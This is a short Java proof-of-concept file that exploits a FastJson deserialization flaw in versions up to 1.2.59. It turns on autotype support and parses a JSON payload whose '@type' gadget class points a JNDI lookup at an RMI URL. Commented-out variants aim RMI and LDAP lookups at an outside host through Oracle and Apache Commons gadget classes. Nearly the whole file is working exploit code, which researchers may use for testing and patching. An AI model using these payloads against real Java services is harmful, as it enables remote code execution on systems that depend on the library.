import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Below_1_2_60_PoC {
    public static void main(String[] args) throws Exception {
        System.out.println("[+] ByPass FastJson <= 1.2.59 JNDI PoC");
        System.out.println("[!] Need setAutoTypeSupport");
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"rmi://localhost:1099/j1dse2\"}";

        //{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://10.10.20.166:1099/ExportObject"}
        //{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://10.10.20.166:1389/ExportObject"}
        JSON.parse(payload);
    }
}
